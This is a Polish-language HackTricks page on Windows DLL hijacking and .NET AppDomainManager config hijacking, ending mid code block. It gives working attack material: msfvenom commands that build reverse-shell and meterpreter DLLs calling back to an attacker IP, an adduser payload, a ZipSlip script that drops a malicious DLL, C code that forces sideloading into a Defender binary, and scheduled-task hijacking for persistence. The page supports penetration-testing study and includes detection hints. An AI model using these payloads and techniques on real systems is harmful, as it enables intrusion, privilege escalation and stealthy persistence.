# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na nakłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest wykorzystywany głównie do wykonywania kodu, zapewniania persistence oraz, rzadziej, do privilege escalation. Pomimo że skupiamy się tutaj na escalation, metoda hijacking pozostaje taka sama niezależnie od celu.

### Typowe techniki

W przypadku DLL hijacking stosuje się kilka metod, a skuteczność każdej z nich zależy od strategii ładowania DLL przez aplikację:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie prawdziwej biblioteki DLL złośliwą, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej biblioteki DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania znajdującej się przed lokalizacją legalnej biblioteki, z wykorzystaniem kolejności wyszukiwania stosowanej przez aplikację.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, uznając ją za nieistniejącą, ale wymaganą bibliotekę DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS — metoda często powiązana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu wraz ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading nie jest jedynym sposobem na nakłonienie zaufanego procesu **.NET Framework** do załadowania kodu attackera. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR konsultuje również plik konfiguracji aplikacji o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). Plik ten może definiować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowane przez attackera assembly umieszczone obok pliku EXE, CLR załaduje je **przed normalną ścieżką wykonywania kodu aplikacji** i uruchomi wewnątrz zaufanego procesu.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>` muszą być obecne, aby użyty został niestandardowy manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalny menedżer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktyczne uwagi:
- To tradecraft specyficzny dla **.NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania DLL w Win32.
- Host musi być rzeczywiście **managed EXE**. Szybki triage: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie obecności **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok pliku EXE**.
- Jest to przydatne w przypadku **signed Microsoft/vendor binaries**, ponieważ zaufany plik EXE pozostaje nietknięty, podczas gdy złośliwy managed assembly wykonuje się wewnątrz tego samego procesu.
- Jeśli masz już zapisywalny katalog instalatora/aktualizatora, AppDomainManager hijacking może zostać użyty jako **first stage**, a następnie można zastosować klasyczne DLL sideloading lub reflective loading dla kolejnych etapów.

### AppDomainManager jako downloader + bootstrap scheduled-task

Praktyczny wzorzec intrusion polega na połączeniu zaufanego managed EXE zarówno ze złośliwym `*.config`, jak i ze złośliwą biblioteką DLL AppDomainManager, która działa wyłącznie jako **mały bootstrapper**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia signed .NET installer lub updater z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiedni plik config powoduje, że CLR ładuje attacker assembly **przed** rozpoczęciem logiki legalnej aplikacji.
3. Złośliwy manager wykonuje **path gate** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE jest uruchomiony z katalogu `Downloads`, a drugi stage może działać wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli kontrola zakończy się powodzeniem, pobiera prawdziwy payload do zapisywalnej przez użytkownika lokalizacji, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persistence za pomocą scheduled task.

Dlaczego ten wariant ma znaczenie:
- Signed host EXE pozostaje niezmieniony, więc triage, który sprawdza wyłącznie hash głównego pliku binarnego, może nie wykryć compromise.
- Proste **path-based anti-analysis** jest powszechne: przeniesienie triady ZIP/EXE/DLL na Desktop, do Temp lub do ścieżki sandboxa może celowo przerwać chain.
- DLL AppDomainManager pierwszego etapu może pozostać mała i low-noise, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany w tym wzorcu:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny** poziom dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Ta technika jest często lepiej klasyfikowana jako **execution/persistence via .NET config abuse** niż jako klasyczny hijacking kolejności wyszukiwania brakującej biblioteki DLL, mimo że operatorzy często łączą obie techniki.

Punkty kontrolne detekcji:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek po rozpakowaniu ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, wraz z **umieszczonym obok** plikiem `<exe>.config`.
- Nowe zadania harmonogramu, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy naśladują updatery przeglądarek/dostawców.
- Krótkotrwałe zarządzane procesy bootstrap, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie wcześniej, jeśli ścieżka pliku wykonywalnego nie pasuje do oczekiwanego katalogu profilu użytkownika.

### Hijacking istniejącego zadania harmonogramu w celu ponownego uruchomienia łańcucha sideloadingu

W celu zapewnienia persistence nie należy szukać wyłącznie **tworzenia nowego zadania**. Niektóre intrusion sets czekają, aż legalny instalator utworzy **zwykłe zadanie updatera**, a następnie **przepisują akcję zadania**, tak aby istniejąca nazwa, autor i trigger nadal wyglądały znajomo dla obrońców.

Uniwersalny workflow:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które zwykle tworzy.
2. Wyeksportuj XML zadania i odnotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, tak aby zadanie uruchamiało Twój **zaufany host EXE** z katalogu stagingowego zapisywalnego przez użytkownika, który następnie wykonuje sideload lub ładuje właściwy payload przez AppDomain.
4. Zarejestruj ponownie tę samą nazwę zadania zamiast tworzyć nowy, oczywisty artefakt persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest to bardziej skryte:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jako aktualizator dostawcy).
- Uruchamia je **Task Scheduler service**, więc walidacja procesu nadrzędnego/przodków często widzi oczekiwany łańcuch harmonogramu zamiast `explorer.exe`.
- Zespoły DFIR, które szukają wyłącznie **nowych nazw zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty polowania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównuj XML z `C:\Windows\System32\Tasks\*` oraz metadane z `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z wartością bazową.
- Generuj alert, gdy zadanie aktualizatora wyglądające na pochodzące od dostawcy uruchamia się z **katalogów zapisywalnych przez użytkownika** lub uruchamia plik EXE .NET z sąsiadującym plikiem `*.config`.

> [!TIP]
> Aby zapoznać się z łańcuchem krok po kroku, który łączy staging HTML, konfiguracje AES-CTR i implanty .NET z DLL sideloading, przejrzyj poniższy workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **następujących 2 filtrów**:

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie następujących 2 filtrów](<../../../images/image (961).png>)

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie następujących 2 filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Common Techniques - Znajdowanie brakujących DLL: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **ogólnie brakujących DLL**, **pozostaw** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, taki jak **"Process Name" "contains" `<exec name>`**, uruchom go i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, szukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, do której możesz zapisywać. Może się tak stać, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym legalną DLL albo gdy żądana DLL nie istnieje i możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć informacje o tym, jak dokładnie ładowane są DLL.**

**Aplikacje Windows** szukają DLL, korzystając z zestawu **wstępnie zdefiniowanych ścieżek** i zachowując określoną kolejność. Problem DLL hijacking pojawia się, gdy szkodliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed autentyczną DLL. Aby temu zapobiec, należy dopilnować, by aplikacja używała ścieżek absolutnych podczas odwoływania się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie istnieje funkcja uzyskująca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy pamiętać, że nie obejmuje to ścieżki dla aplikacji określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Po jego wyłączeniu bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie funkcja jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z użyciem **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który ładuje **LoadLibraryEx**.

DLL może również zostać załadowana za pomocą ścieżki absolutnej zamiast nazwy. W takim przypadku Windows szuka samej DLL wyłącznie pod tą ścieżką; zależności żądane po nazwie nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj wyjaśniać.

### Łączenie dowolnego zapisu pliku z hijackingiem brakującej DLL

**Powiązana technika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny jest uruchamiany zgodnie z **harmonogramem/usługą**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawdziwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli posiadaną przez ciebie primitive jest **arbitrary write w stylu ZipSlip**, przygotuj ZIP, którego wpis wychodzi poza katalog rozpakowywania, tak aby DLL trafiła do katalogu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do monitorowanej skrzynki/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloadingu za pomocą RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj kontrolowany przez atakującego katalog, można zmusić proces docelowy, który rozwiązuje importowaną bibliotekę DLL po nazwie (bez ścieżki absolutnej i bez używania flag bezpiecznego ładowania), do załadowania złośliwej biblioteki DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowe DllPath wskazujące na kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy binarny plik docelowy rozwiązuje bibliotekę DLL po nazwie, loader uwzględni podaną wartość DllPath podczas rozwiązywania, umożliwiając niezawodny sideloading nawet wtedy, gdy złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa wyłącznie na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub ładować ją za pomocą LoadLibrary po nazwie (bez ścieżki absolutnej i bez używania LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na stałe ścieżki absolutne nie mogą zostać przejęte. Eksporty przekierowane oraz SxS mogą zmienić kolejność pierwszeństwa.

Minimalny przykład w C (ntdll, szerokie ciągi znaków, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloadingu DLL za pomocą RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub proxy do rzeczywistego pliku) w katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll według nazwy, korzystając z powyższej techniki. Loader rozwiąże import za pośrednictwem podanego DllPath i wykona sideloading Twojego pliku DLL.

Zaobserwowano, że technika ta jest wykorzystywana w rzeczywistych kampaniach do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher umieszcza pomocniczy plik DLL, który następnie uruchamia podpisany przez Microsoft plik binarny podatny na hijacking, z niestandardowym DllPath wymuszającym załadowanie pliku DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### Hijacking .NET AppDomainManager za pośrednictwem `.exe.config`

W przypadku celów **.NET Framework** sideloading można wykonać **przed `Main()`**, bez patchowania pamięci, wykorzystując sąsiedni plik **`.exe.config`** aplikacji. Zamiast polegać wyłącznie na kolejności wyszukiwania bibliotek DLL Win32, atakujący umieszcza legalny plik .NET EXE obok złośliwej konfiguracji oraz co najmniej jednego kontrolowanego przez atakującego assembly.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE uruchamia się, a **CLR odczytuje `<exe>.config`**.
2. Konfiguracja ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby runtime utworzył kontrolowany przez atakującego obiekt `AppDomainManager`.
3. Złośliwy manager uzyskuje **wykonanie przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ta sama konfiguracja może wymusić, aby CLR najpierw rozwiązywał lokalne assembly (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację runtime i telemetrię bez patchowania inline.

Wzorzec w stylu kampanii (dokładne zagnieżdżenie może różnić się w zależności od dyrektywy / wersji CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** utrzymuje rozwiązywanie assembly w katalogu aplikacji, zmieniając folder w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji full-trust ładować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher-policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór runtime jest bardziej deterministyczny.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** z poziomu konfiguracji, zamiast patchować przez implant `EtwEventWrite` w pamięci.

Schemat operacyjny obserwowany w ostatnich kampaniach:
- Etap 1 upuszcza `setup.exe`, `setup.exe.config` oraz lokalne assembly.
- Etap 2 kopiuje je do wiarygodnego folderu **AppData update**, zmienia nazwę hosta na coś w rodzaju `update.exe`, a następnie uruchamia go ponownie za pomocą **scheduled task**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwanego rodzica `svchost.exe` z Task Scheduler) przed załadowaniem końcowego RAT DLL/export.

Pomysły na hunting:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET**, uruchamiane z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Scheduled tasks, które ponownie uruchamiają przemianowane binaria update z **`%LOCALAPPDATA%`** lub katalogów aplikacji `\bin\update\`.
- Łańcuchy rodzic/dziecko, w których scheduled task uruchamia zaufany host .NET, który natychmiast ładuje assembly spoza vendora z własnego katalogu.

#### Wyjątki dotyczące kolejności wyszukiwania dll na podstawie dokumentacji Windows

Dokumentacja Windows wskazuje pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL o tej samej nazwie co DLL już załadowany w pamięci**, system pomija standardowe wyszukiwanie. Zamiast tego sprawdza przekierowanie i manifest, a dopiero potem domyślnie używa DLL już znajdującego się w pamięci. **W tym scenariuszu system nie wyszukuje DLL**.
- Jeśli DLL jest rozpoznany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji known DLL wraz ze wszystkimi zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie zależnych DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkowy DLL został zidentyfikowany przy użyciu pełnej ścieżki.

### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działać z **innymi uprawnieniami** (ruch horyzontalny lub lateral movement), a któremu **brakuje DLL**.
- Upewnij się, że dostęp do zapisu jest dostępny dla dowolnego **katalogu**, w którym będzie **wyszukiwany DLL**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w ścieżce systemowej.

Te warunki wstępne nie występują domyślnie często: uprzywilejowane pliki wykonywalne zazwyczaj nie mają brakujących zależności DLL, a standardowi użytkownicy zwykle nie mogą zapisywać do katalogów systemowych ścieżki wyszukiwania. Błędna konfiguracja może jednak ujawnić oba te warunki.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Chociaż jego głównym celem jest UAC bypass, zawiera PoC DLL-hijacking dla konkretnych wersji Windows, które często można dostosować do znalezionego zapisywalnego katalogu.

Pamiętaj, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów znajdujących się w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty biblioteki DLL za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik dotyczący **abuse DLL Hijacking w celu eskalacji uprawnień** przy uprawnieniach do zapisu w folderze **System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w dowolnym folderze wewnątrz systemowego PATH.\
Innymi interesującymi automated tools do wykrywania tej podatności są **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll._

### Example

Jeśli znajdziesz exploitable scenario, jedną z najważniejszych rzeczy umożliwiających jego pomyślne wykorzystanie byłoby **utworzenie dll, która eksportuje co najmniej wszystkie funkcje importowane przez executable**. Należy jednak pamiętać, że DLL Hijacking jest przydatny do [**eskalacji z poziomu Medium Integrity do High (bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z poziomu[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia poprawnej dll** znajdziesz w tym opracowaniu dotyczącym DLL hijacking, skupionym na DLL hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto, w **next section** znajdziesz kilka **basic dll codes**, które mogą być przydatne jako **templates** lub do utworzenia **dll z wyeksportowanymi funkcjami, które nie są wymagane**.

## **Tworzenie i kompilowanie DLL**

### **DLL Proxifying**

Zasadniczo **DLL proxy** to DLL zdolna do **wykonania złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** i **działania** zgodnie z **oczekiwaniami**, poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz wskazać executable i wybrać bibliotekę, którą chcesz proxify, a następnie **wygenerować proxified dll**, albo **wskazać DLL** i **wygenerować proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własny

W wielu przypadkach skompilowany przez Ciebie DLL musi **eksportować każdą funkcję importowaną przez proces docelowy**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozwiązać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
